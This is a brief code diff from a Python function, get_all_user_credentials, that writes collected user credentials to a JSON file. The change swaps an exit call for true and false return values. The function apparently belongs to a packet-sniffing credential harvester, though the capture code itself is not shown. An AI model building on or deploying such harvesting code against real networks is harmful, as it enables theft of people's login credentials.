@@ -39,4 +39,6 @@ def get_all_user_credentials(packet, data):
         with open("user_credentials.json", 'w') as json_file:
             json.dump(user_credentials, json_file, indent=4)
         print("STORED ALL THE CREDENTIALS IN `user_credentials.json`")
-        exit(0)
+        return True
+    else:
+        return False
